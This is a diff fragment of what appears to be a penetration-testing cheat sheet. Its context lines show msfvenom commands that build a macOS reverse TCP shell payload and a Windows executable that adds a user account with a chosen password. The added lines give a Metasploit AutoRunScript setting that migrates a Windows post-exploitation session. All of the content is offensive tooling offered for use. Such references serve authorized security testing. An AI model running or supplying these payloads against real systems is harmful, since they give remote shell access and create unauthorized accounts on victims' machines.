@@ -106,3 +106,8 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port
 ```
 msfvenom -p windows/adduser USER=<USER> PASS=<PASSWORD> -f exe > adduser.exe
 ```
+
+## Manage unstable shells (Windows)
+```
+AutoRunScript=post/windows/manage/migrate
+```
